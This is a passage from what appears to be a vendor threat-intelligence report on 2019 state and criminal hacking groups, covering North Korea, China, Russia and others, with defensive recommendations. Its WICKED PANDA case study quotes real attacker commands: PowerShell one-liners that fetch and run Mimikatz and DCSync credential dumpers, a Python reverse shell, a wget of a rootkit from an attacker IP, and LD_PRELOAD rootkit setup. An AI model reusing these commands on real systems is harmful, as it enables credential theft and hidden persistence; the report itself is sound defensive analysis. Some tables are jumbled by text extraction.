adversaries, VELVET CHOLLIMA often employs similar\nspear-phishing techniques to socially engineer its intended victims. Therefore,\nuser awareness and education are essential to limit vulnerability to customized\nphishing lures. In addition, robust monitoring, detection and threat hunting are vital\nto ensuring an effective network defense posture.\n\n\n-----\n\n###### DPRK_\n\n\n###### LOOKING FORWARD\n\nOn December 27, 2019, a judge in the U.S. District Court for the Eastern District\nof Virginia unsealed a civil case filed against two John Does associated with\nVELVET CHOLLIMA. This action resulted in the seizure of about 50 domains\nused by VELVET CHOLLIMA to conduct web-based credential harvesting and to\nuse as C2 for the custom tools GoldGrabber and BabyShark. Concurrently, the\nclosing months of 2019 saw a reduction in the number of BabyShark operations\nobserved by CrowdStrike Intelligence. That said, previous legal actions against\nDPRK adversaries have done little to slow their operations, and CrowdStrike\nIntelligence expects VELVET CHOLLIMA to continue targeting government, nongovernmental organizations (NGOs) and academic entities working on nuclear\nnonproliferation issues.\n\nThis target scope is particularly relevant considering that diplomatic relations\nbetween DPRK and the U.S. cooled over the course of 2019. As the year-end\ndeadline for nuclear negotiations approached in December, North Korea accused\nthe U.S. of dragging its feet, and then announced it would no longer be bound by\nlimitations on its weapons testing. While disruptive cyber activity against the U.S.\nhas not been observed, a return to harsher rhetoric only further supports the\nassessment that DPRK-affiliated adversaries will continue at the current pace\nof operations. Because sanctions relief is unlikely, these operations will very\nlikely include further targeting of the financial sector, particularly cryptocurrency\nexchanges, as cryptocurrency can be used outside of conventional banking\nplatforms. There may also be a return to more military-based targeting if\ntensions escalate in 2020.\n\n###### While disruptive cyber activity against the U.S. has not been observed, a return to harsher rhetoric only further supports the assessment that DPRK-affiliated adversaries will continue at the current pace of operations.\n\n\n-----\n\n###### Activity attributed to WICKED PANDA and a possible CIRCUIT PANDA operation included supply chain compromises, demonstrating China’s continued use of this tactic to identify and infect multiple victims.\n\n\n## CHINA\n\nChinese adversary activity was steady throughout 2019, with a prominent focus on\nthe telecommunications sector. Healthcare entities were also included, providing\nfurther evidence that Chinese targeted intrusions are enabling corporate espionage\nof information vital to bolstering these key industries domestically. China also\ncontinued to target the government and defense sectors of regional neighbors, with\na concentrated focus on Southeast Asia late in the year.\n\nBoth CrowdStrike Intelligence analysis and multiple public reports revealed malicious\ncyber activity targeting minority populations, such as Tibetans and Uyghurs. China\nalso used computer network operations designed to impede the citizen protests\nin Hong Kong that occurred in the latter half of 2019. The range of these activities\nruns the gamut from use of iOS exploits and strategic web compromises (SWCs), to\ndistributed denial of service (DDoS) attacks and influence operations.\n\nThe majority of observed activity has been attributed to adversaries that CrowdStrike\nIntelligence has assessed to be supporting or working for China’s Ministry of State\nSecurity (MSS). CrowdStrike identified numerous active WICKED PANDA infections\nin the first half of the year, then additional new malware samples in Q3 and Q4 2019,\neven after industry reporting detailed WICKED PANDA (aka APT 41) operations.\nActivity attributed to WICKED PANDA and a possible CIRCUIT PANDA operation\nincluded supply chain compromises, demonstrating China’s continued use of this\ntactic to identify and infect multiple victims. Additional evidence has indicated that\nsome older named adversaries have reemerged; these include PIRATE PANDA and\nSTALKER PANDA, both of which were unobserved in 2018.\n\nIt is suspected that actors associated with the People’s Liberation Army (PLA)\nremain active, although CrowdStrike Intelligence’s current visibility into their\ntargeting and TTPs is limited. LOTUS PANDA is associated with the PLA Strategic\nSupport Force (PLASSF) at low confidence, and the return of hibernating\nadversaries like STALKER PANDA and PIRATE PANDA — neither of which have\nbeen associated with MSS — may herald a resurgence of more PLA-aligned actors.\nSeveral unnamed but suspected Chinese activities were identified, but due to the\nuse of publicly available toolsets, attribution remains undetermined. This activity\nunderscores how China’s use of open-source and LOTL TTPs continues to be a\nhighly effective means of inhibiting analysis and remediation efforts.\n\n\n-----\n\n##### CHINA_\n\n\n###### ACTIVE ADVERSARIES\n\nAdversary Ops Tempo Description\n\nin 2018, WICKED PANDA was linked to multiple\n\nWICKED\nHigh\nPANDA\n\ntechnology, gaming, hospitality, utilities and\npharmaceutical.\n\nMUSTANG\nHigh\nPANDA\n\nEMISSARY\nMedium-High\nPANDA\n\nregion for this actor.\n\nCrowdStrike Intelligence identified new PIRATE\n\nPIRATE\nMedium-High\nPANDA\n\nagainst Vietnam.\n\nLOTUS\nMedium\nPANDA\n\non an adversary known as Thrip.\n\nJUDGMENT including research centers for defense and\nMedium\nPANDA\n\ntargeted a manufacturing sector organization.\n\nActivity against petrochemical and industrial\n\nSTALKER\nMedium\nPANDA\n\n2019.

This adversary targeted a wide variety of sectors, including telecommunications, technology, gaming, hospitality, utilities and pharmaceutical.|\n|---|---|---|\n|MUSTANG PANDA|High|MUSTANG PANDA was consistently active, starting in March and continuing through the end of 2019. Observed activity indicates targets are likely in or related to Vietnam, Myanmar, Mongolia and Pakistan.|\n|EMISSARY PANDA|Medium-High|EMISSARY PANDA used custom and commodity malware against healthcare and telecommunication sector targets throughout 2019.

These intrusions exhibited a\nhigh operational tempo, a plethora of attack techniques and a custom toolkit\ndeveloped to support stealthy intrusion operations on Windows- and Linuxbased systems.\n\n###### Initial Observations\n\nDuring one WICKED PANDA intrusion, OverWatch identified extensive use of\nLOTL techniques. The threat actor accessed a domain controller, via RDP, using\npreviously acquired credentials and performing initial host reconnaissance followed\nby installation of a malicious implant and credential theft. As the company expanded\nendpoint visibility into the environment by deploying the CrowdStrike Falcon\nplatform, OverWatch monitoring progressed and the extent of the intrusion became\napparent, with evidence of a strong adversary foothold and lateral movement across\nthe network.\n\n###### Notable Adversary Behavior\n\nThe adversary used the Background Intelligent Transfer Service (BITS) to download\nand install an implant hosted on a legitimate third-party website. The threat actor\nrenamed the implant as f.exe and copied it to the root directory of the system drive\non the compromised domain controller, and subsequently executed the implant with\na command-line-supplied password used to decrypt the malicious payload. Once\ndecrypted, as part of the implant’s installation chain, a temporary file was written\nto the %temp% directory. In its final stage, the temporary file was executed via\nrundll32.exe and acted as a loader for the main malicious payload, a variant of\nthe Winnti RAT.\n\nHaving installed the implant with SYSTEM privileges, the adversary terminated the\nRDP session, and shortly after, returned to the system through the recently installed\nmalicious implant to harvest credentials with PowerShell Empire cmdlets:\n\n\n-----\n\n##### CHINA_\n\n\n###### OVERWATCH FEATURE_\n\n\npowershell -ep Bypass -NoP -NonI -NoLogo -W Hidden -c IEX\n(New-Object Net.WebClient).DopireProjeing('https://raw.\ngithubusercontent.com/EmpireProject/Empire/master/data/\nmodule_source/credentials/Invoke-DCSync.ps1');Invoke-DCSync\n-PWDumpFormat\n\nNote that the command line appears to be corrupted with the DownloadString\ncmdlet rendered as DopireProjeing, leading to a PowerShell method invocation\nfailure. Immediately after, the threat actor attempted to run the Invoke-Mimikatz\ncmdlet, this time using a correctly formatted command line and a different\nrepository:\n\npowershell \"IEX (New-Object Net.WebClient).\nDownloadString('https://raw.githubusercontent.com/\nmattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.\nps1'); Invoke-Mimikatz -DumpCreds\"\n\nThroughout the intrusion, the threat actor continued to execute malicious implants\nby using a combination of acquired valid credentials and BITS or PowerShell\ncmdlets to download and execute commands on the local systems. However, in one\ninstance, OverWatch identified the attempts to use a different technique known as\nDLL search order hijacking to execute the Winnti RAT.\n\nThe adversary first copied the implant file to a remote system by using Windows\nAdmin Shares:\n\n\\[REDACTED]\\c$\\windows\\apphelp.dll\n\nIt then executed the explorer.exe process that loads apphelp.dll via creation\nof a scheduled task:\n\nschtasks /create /s [REDACTED] /ru \"NT Authority\\System\" /tn\n\n[REDACTED] /tr \"c:\\windows\\explorer.exe\" /sc once /st 11:37\n\nThe malicious implant contained an embedded malicious driver. In order to combat\na Windows’ restriction requiring any driver on 64-bit systems to be signed by a\nMicrosoft-verified cryptographic signature, the adversary had signed the driver with\na legitimate (most likely stolen) certificate from another company.\n\nIn a separate WICKED PANDA intrusion, OverWatch observed the adversary\ndeploying its tools, including a user-mode rootkit, on a Linux server. The activity was\nconducted using a simple Python reverse shell:\n\n\n-----\n\n##### CHINA_\n\n\n###### OVERWATCH FEATURE_\n\n\npython /tmp/back.py [IP Address REDACTED] 9091\n\nThe threat actor downloaded a simple malware loader with an embedded\nWinnti implant and a customized version of a publicly available user-mode\nrootkit, which was configured to load via the LD_PRELOAD technique:\n\nwget [IP Address REDACTED]:82/libsshd.so\nsudo ./install\ncp ./libsshd.so /lib/x86_64-linux-gnu/libsshd.so\n-chmod 777 /lib/x86_64-linux-gnu/libsshd.so\n\nSuccessful installation of the rootkit adds the following entry of /$LIB/\nlibsshd.so to the /etc/ld.so.preload file. This allows the usermode rootkit to load and precede function calls responsible for stealthy\noperations on a system, such as anti-debugging, hiding files and network\nconnections, remote access and cleaning up authentication log entries.\n\n###### Conclusions and Recommendations\n\nDue to WICKED PANDA’s propensity to steal and reuse valid credentials,\ndefenders should actively hunt and monitor for suspicious user,\nadministrator and service account behavior across the network. While\nLOTL techniques are challenging to defend against, some actions can\nmitigate the threat. For example, relevant to this case, limit PowerShell’s\nexecution policy as much as is reasonably possible. Also, monitor for\nexecution of rundll32.exe in unusual circumstances or with abnormal\narguments. While defending against rootkits is similarly difficult, it is\nalways wise to ensure antivirus software is enabled with proper prevention\npolicies, and continuously hunt for unexpected DLLs and services.\n\n\n-----\n\n##### CHINA_\n\n###### In addition to supporting currency generation, LABYRINTH CHOLLIMA’s targeting of cryptocurrency exchanges could support espionage- oriented efforts designed to collect information on users or cryptocurrency operations and systems.\n\n\n###### SECTOR HIGHLIGHT:  TELECOMMUNICATIONS\n\nMultiple Chinese adversaries — including LOTUS PANDA, WICKED PANDA and\nEMISSARY PANDA — were linked to the targeting of the telecommunications\nsector in 2019. Other incidents, which were notable for the use of publicly available\ntools, remain unattributed but appear to support China’s efforts against this sector.\nCrowdStrike Intelligence assesses that China’s interest in targeting this sector has\narisen along with a need to target upstream providers to support its traditional and\neconomic espionage goals.\n\nThe power of telecom data to espionage agencies was illustrated by the malware\nknown as MESSAGETAP, which was reportedly used by WICKED PANDA to monitor\nshort message service (SMS) traffic from telecom networks. MESSAGETAP can\ncollect and store SMS data based on selection criteria, including phone numbers,\ninternational mobile subscriber identity (IMSI) numbers and keywords. The ability\nto collect data based on specific phone numbers and IMSI numbers indicates that\nthe adversary predetermined which individuals to target for collection, possibly\nidentifying phone numbers in previous reconnaissance or collection activities.\n\nIncidents from 2019 include multiple compromises of telecom companies in Asia,\nshowing a continued interest in regional neighbors. While these incidents may\nalso support traditional or economic espionage goals, open-source reporting from\nSeptember 2019 claimed that some targeted intrusions against telecoms were used\nby China to track Uyghurs in Central and Southeast Asia. This activity reportedly\ntargeted telecom operators in Turkey, Kazakhstan, India, Thailand and Malaysia —\nmirroring the observed target scope for tracked Chinese adversaries.\n\nTelecom sector targeting — especially in the Central and Southeast Asia regions\n— would also complement China’s plan to develop a Digital Silk Road. This\ninitiative aims to broaden and deepen digital connections to other nations via the\nconstruction of cross-border and submarine optical cables, communication trunks\nand satellite information passageways, and the development of fifth-generation\n(5G) mobile networks. Regarding 5G technology specifically, multiple governments\n(including the United States) have taken note and refused opportunities to work with\nHuawei, citing concerns over the company’s associations to military and intelligence\nservices in China, Russia and DPRK.\n\n\n-----\n\n##### CHINA_\n\n\n###### LOOKING FORWARD\n\nThe publication of WICKED PANDA-associated activities, as well as the\nIntrusionTruth reporting on KRYPTONITE PANDA (reported in January 2020),\nmay have a cooling effect on the MSS’s reliance on using contract entities in the\nnear-term, but CrowdStrike Intelligence expects a return to operations will occur\nafter tactics are reviewed and updated. Targeting by actor groups associated with\nthe MSS will likely continue to focus on maintaining access to upstream telecom\nproviders, as well as developing new supply chain compromises.\n\nCrowdStrike Intelligence anticipates that the first draft of China’s next Five-Year Plan\n(FYP) will be released in early 2020. This draft is only the first step before a final\nversion is agreed upon in 2021; however, the initial proposal may contain clues about\nthe future priorities of the Chinese Communist Party (CCP) and will help launch\nplanning in numerous CCP agencies. Part of the previous FYP outlined key industries\nfor domestic growth, a vital indication of which sectors are at an increased risk\nof IP theft. Despite the U.S.’s request for controls on IP theft and corporate\nespionage, the targeting of U.S. companies engaged in key industries deemed vital\nto China’s strategic interests — including clean energy, healthcare, biotechnology,\npharmaceuticals and others — is likely to continue. CrowdStrike Intelligence\nassesses this is likely despite announcements from Washington and Beijing that a\nlimited trade deal may bring an end to the U.S.-China trade war.\n\nChina’s improving disinformation efforts will continue to have an immediate effect in\nHong Kong and Taiwan following their resistance to CCP and support of democratic\nvalues throughout 2019 and into 2020. These campaigns will augment China’s robust\ntargeted intrusion resources when dealing with regional neighbors. Western companies\nare likely to be caught in the middle, between domestic audiences supporting human\nrights (if only nominally) and pressures from the CCP to bow to censorship. As both\nTaiwan and Hong Kong are seen by the CCP as “domestic” interference and testing\ngrounds for China-backed cyber operations, they likely foreshadow China’s interest in\nfomenting unrest and conducting disinformation campaigns on Western democratic\nelections such as the U.S. presidential election in November 2020.\n\n\n-----\n\n## RUSSIA\n\nIn 2019, observed Russian computer network operations targeting Ukraine were\na predominant feature of targeted intrusions overall. This activity included highvolume PRIMITIVE BEAR activity throughout the year and limited FANCY BEAR\nspear-phishing campaigns in the fall. These campaigns likely are designed to provide\nRussian leaders with the information they need to make informed decisions going\ninto diplomatic negotiations, or they may be used tactically by Russia-affiliated\nforces for battlefield intelligence.\n\nCrowdStrike Intelligence continued to conduct technical analysis of VENOMOUS\nBEAR’s highly sophisticated toolset. Two tools — Facade and Blueprint — are\nbackdoors that act as mail plugins, communicating to a C2 server via specially\ncrafted email attachments. Facade began as an email logger used within\nVENOMOUS BEAR’s Chinch malware framework, but in 2018, it was used as\na fully fledged backdoor. Blueprint operates in a similar fashion but is installed\nas a Microsoft Exchange transport agent, a legitimate component of Microsoft\nExchange Server. Analysis of the most recent activity attributed to VENOMOUS\nBEAR indicated that the adversary continues to use the Chinch and Snake malware\nframeworks, as well as the AesLoader and the Skipper backdoor.\n\n###### CrowdStrike Intelligence continued to conduct technical analysis of VENOMOUS BEAR’s  highly sophisticated toolset.\n\n\n-----\n\n##### RUSSIA_\n\n\n###### ACTIVE ADVERSARIES\n\nAdversary Ops Tempo Description\n\nThroughout 2019, CrowdStrike Intelligence\n\nPRIMITIVE BEAR High\n\nhigh-tempo targeted intrusion operations.\n\nFANCY BEAR Medium\n\nvariants dubbed NimbleDown and Zekadero.\n\nBEAR’s compromise of HELIX KITTEN’s\n\nVENOMOUS BEAR Medium\n\nregion is within the adversary’s target scope.\n\nBERSERK BEAR Medium-Low available sources to determine the extent of\nBERSERK BEAR’s activity.\n\nCrowdStrike Intelligence is investigating a\n\nCOZY BEAR _Unknown_\n\nCOZY BEAR.\n\nVOODOO BEAR _Unknown_ recent industry reporting on activity possibly\nattributed to VOODOO BEAR.\n\nTable 9.\n**Summary of Activity Attributed to Russian Adversaries in 2019**\n\n|Adversary PRIMITIVE BEAR|Ops Tempo High|Description Throughout 2019, CrowdStrike Intelligence observed PRIMITIVE BEAR extensively targeting the Ukrainian government and military sector in high-tempo targeted intrusion operations.|\n|---|---|---|\n|FANCY BEAR|Medium|CrowdStrike Intelligence has linked likely spear- phishing campaigns targeting Belarus, Ukraine and Kazakhstan to FANCY BEAR, although this is likely a subset of the adversary's total activity.

As Ukraine and Russia work toward\nending a five-year conflict, it is likely that Russia-affiliated intelligence collection\noperations will continue — if not increase — in the future.\n\nOn December 9, 2019, the World Anti-Doping Agency (WADA) concluded that the\nRussian Anti-Doping Agency (RUSADA) was not in compliance with international\nregulations governing clean participation in sports, and as a result, the Russian\ngovernment would be banned from participating in or hosting international athletic\ncompetitions for four years and face a fine. CrowdStrike Intelligence notes that\nRussian state-nexus adversaries and pro-Russian information operation (IO) fronts\nhave taken aim at sports regulatory bodies, athletes and events following such bans\nin the past in retaliation for the exclusion of Russian athletes from international\ncompetitions. Based on this historical precedent, CrowdStrike Intelligence assesses\nthat it is highly likely that Russia will respond with targeted intrusions and/or\ninformation operations targeting these organizations. Specific targets may include\nentities with a nexus to the 2020 Tokyo Olympic Games.\n\n###### As Ukraine and Russia work toward ending a five-year conflict, it is likely that Russia- affiliated intelligence collection operations will continue — if not increase — in the future.\n\n\n-----\n\n#### OTHER ADVERSARIES\n\n###### INDIAN SUBCONTINENT\n\nOn August 5, 2019, India’s Modi administration revoked Article 370 of the nation’s\nconstitution, thereby stripping the relative political autonomy that the Indian state\nof Jammu and Kashmir enjoyed for seven decades. This action, assessed to be\na significant deviation from the status quo, immediately preceded an increase in\ntargeted intrusion activity from adversaries linked to India and Pakistan. These\nactors include three named adversaries and an unnamed cluster with a suspected\naffiliation to India.\n\n###### Active Adversaries\n\nAdversary Description\n\nAfter what appeared to be a one-year hiatus, CrowdStrike\nIntelligence identified renewed activity from QUILTED TIGER in\n\nQUILTED TIGER\n\nAugust 2019.

This departure from OCEAN\nBUFFALO’s target scope of geopolitical intelligence gathering and reconnaissance\nindicated that Vietnam also has an economic espionage program. Since this time,\nunconfirmed third-party reporting released details of suspected OCEAN BUFFALO\nintrusions against automotive sector entities in Germany and South Korea beginning\nin Spring 2019. Such targeting coincided with 2019 initiatives from the Vietnam\nMinistry of Industry and Trade designed to support domestic auto projects. At\nthe same time, Vietnamese authorities announced the goal for its auto industry\nto produce 35% to 40% of domestic auto components by 2020, an increase from\n10%. In March 2019, Vietnam also announced its first made-in-Vietnam automobile,\nproduced by VinFast.\n\nCrowdStrike Intelligence has assessed that the Vietnam Cyberspace Operations\nCommand (Command 86), which was established in January 2018, likely represents\nthe country’s premier entity for computer network operations. This assessment\ncarries moderate confidence, as it is based on open-source reporting and brief\nstatements made by Vietnamese officials. Notably, while the components that make\nup Command 86 are under the direct administration of Vietnam’s Ministry of National\nDefense (MND), statements from a March 2018 military conference characterized\nCommand 86 as an affiliate of the MND and revealed that its Communist Party of\nVietnam (CPV) organization reports directly to the Central Military Commission\n(CMC), which oversees the MND.\n\nNew missions for this organization began in April 2018, a few months prior\nto when OCEAN BUFFALO operations against the automotive industry were\nobserved. Additionally, Command 86’s predecessor organization, the General Staff\nDepartment’s Information Technology Department, was founded in 2011, less than a\nyear before the first OCEAN BUFFALO activity was observed. As new information\ncomes to light showing potential new overlaps between Command 86 and OCEAN\nBUFFALO, these factors will be taken into account in further considerations of the\npotential connection between the two.\n\n\n-----\n\n-----\n\n-----\n\n###### CONCLUSION\n\n RANSOMWARE\n\nCriminally motivated ransomware attacks dominated the headlines in 2019, and\nthere are currently no indications that BGH operators will decrease the pace\nof their operations. Unlike BOSS SPIDER in 2018, CrowdStrike Intelligence\nanalysis indicates that INDRIK SPIDER remains active following the indictment\nof individuals associated with the group, a testament to the group’s endurance.\nFollowing a profitable year, WIZARD SPIDER, DOPPEL SPIDER and PINCHY\nSPIDER are also unlikely to rest on their laurels. In addition to traditional criminal\nenterprises, CrowdStrike Intelligence is investigating possible collaboration between\nsophisticated eCrime adversaries and state-sponsored targeted intrusions, with\ninitial evidence suggesting some tool overlaps and/or cooperation with intelligence\nservices in DPRK and Russia.\n\n**Recommendation: Turn it on and push it out! Fully leverage the**\n**protection you have.**\n\nTime and again, CrowdStrike observed successful intrusions in\nenvironments where security controls were in place that could\nhave successfully blocked attacks, but were not configured by the\norganization to do so or were not fully deployed across the environment.\nThe proliferation of BGH has dramatically increased the impact on\norganizations that fail to deploy proper protections. Smart organizations\nwill spend the time needed to maximize the protection they gain from\nexisting security controls.\n\n###### CREDENTIALS\n\nThe year 2019 saw increased use of valid credentials in a wide range of cyberattacks,\npart of the trend toward malware-free attack techniques. Attackers obtained and\nleveraged credentials to gain access to systems, move laterally across organizations\nand establish persistence. As long as organizations continue to use basic user IDs and\npasswords for authentication, CrowdStrike anticipates this trend will continue.\n\n\n-----\n\nCrowdStrike Intelligence reported on data breaches enabled by the compromise of\n2FA. Such incidents highlight the vulnerability of this technology and indicate that\nmobile phones may continue to be a target of opportunity for malicious actors of all\nmotivations. CrowdStrike Intelligence expects malware designed to intercept tokens\nor take screenshots of authorization messages will continue to be developed. Statesponsored targeting of mobile platforms will almost certainly be driven by purported\ndomestic security concerns, as exemplified by China’s use of iOS exploit chains\nagainst minority communities (reported publicly in August 2019).\n\n**Recommendation: Protect identities.**\n\nAs a baseline, 2FA should be established for all users because today’s\nattackers have proven to be adept at accessing and using valid\ncredentials, quickly leading to deeper compromise. Properly deployed,\n2FA makes it much more difficult for adversaries to leverage privileged\naccess to achieve their objectives.\n\n2FA is not a panacea, however, and implementing it does not immediately\nsolve the problem of protecting identities. In addition to 2FA, a robust\nprivilege access management process will limit the damage adversaries\ncan do if they get in, and reduce the likelihood of lateral movement.\n\n###### SOCIAL ENGINEERING\n\nNetwork defenders should never underestimate the effectiveness of old-fashioned\nsocial engineering techniques. While business email compromise (BEC) scammers\nand targeted eCrime groups have long used telephone conversations to entice\nvictims to open an email or click on a malicious document, incidents in 2019 showed\nthese tactics being adopted by targeted intrusion actors supporting DPRK and\nIranian operations. Penetration testing tools like the stalwart Cobalt Strike will\nremain popular and may increasingly be joined by other red-teaming tactics such as\nCARBON SPIDER’s use of HID (human input device)-emulation USB devices, which\nwas reported in January 2020.\n\n**Recommendation: Enlist your users in the fight.**\n\nWhile technology is clearly critical in the fight to detect and stop\nintrusions, the end user remains a critical link in the chain to stop\nbreaches. User awareness programs should be initiated to combat the\ncontinued threat of phishing and related social engineering techniques.\n\n\n-----\n\n###### GEOPOLITICAL TENSIONS\n\nThe very beginning of 2020 was marked by a sudden increase in tensions between\nIran and the U.S., including military action undertaken on both sides. Although\nrhetoric de-escalated by mid-January, CrowdStrike Intelligence assesses that\nhacktivism, disinformation campaigns on social media in Farsi and English, and\nan elevated risk of targeted intrusions (including destructive attacks) will remain\nthrough at least the first quarter of 2020. Given previously observed targeting\ntrends, Iran-based targeted intrusion activity is likely to target U.S. and MENA\nentities in the government, oil and gas, technology and maritime sectors.\n\nIran and Russia have leveraged U.S. social media platforms to develop information\noperations (IO) campaigns, and recent evidence has demonstrated that China is\nquickly developing similar disinformation TTPs. The publication of TTPs associated\nwith these operations may lead to less obvious tactics in the coming year, although\nthe intent will remain the same — to promote division within communities.\n\n**Recommendation: Accept the 1-10-60 challenge.**\n\nCombating sophisticated adversaries requires a mature process that\ncan prevent, detect and respond to threats with speed and agility.\nCrowdStrike urges organizations to pursue the “1-10-60 rule” in order to\neffectively combat sophisticated cyberthreats:\n\nDetect intrusions in under one minute.\n\n\u0007 Investigate and understand threats in under 10 minutes.\n\n\u0007Contain and eliminate the adversary from the environment\nin under 60 minutes.\n\nOrganizations that meet this 1-10-60 benchmark are much more likely to eradicate the\nadversary before the attack spreads from its initial entry point, minimizing impact and\nfurther escalation. Meeting this challenge requires investment in deep visibility, as well\nas automated analysis and remediation tools across the enterprise, reducing friction\nand enabling responders to understand threats and take fast, decisive action.\n\n**Recommendation: Look for partners to help fill the talent gap.**\n\nOperating at 1-10-60 velocity also takes more than technology.\nDefending against sophisticated threats ultimately requires mature\nprocesses and effective, dedicated security professionals. Not every\norganization is equipped to engage in this sort of battle 24/7. Successful\nenterprises often look outward for help, partnering with best-in-class\nexternal solution providers to help fill critical talent gaps in a costeffective manner.\n\n\n-----\n\n###### ABOUT CROWDSTRIKE\n\nCrowdStrike® Inc.
